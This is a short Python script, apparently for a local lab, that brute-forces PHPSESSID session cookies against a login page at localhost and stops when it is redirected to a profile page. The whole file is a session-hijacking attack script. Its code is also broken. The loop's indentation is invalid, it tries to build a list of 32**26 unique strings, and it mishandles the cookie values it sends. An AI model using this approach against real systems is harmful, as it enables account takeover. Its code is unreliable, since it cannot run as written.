
# imports
from bs4 import BeautifulSoup as bs
import requests
import strgen

# constants
url = "http://localhost/login/new/index.php"
name = 'PHPSESSID'
            
# brute forcing the session with the created file

with requests.Session() as s:
    a = strgen.StringGenerator("[a-v0-9]{26}").render_list(32**26, unique=True)
        for c in a:
            c = str(c)[:-1]  # removing '\n' from the cookie string
            s.cookies.set(value=c, name=name)
            r = s.post(url, data=s.cookies)
            soup = bs(r.content, 'html.parser')
            if r.url == 'http://localhost/login/new/profile.php':
                print("Brute force succesful")
                break
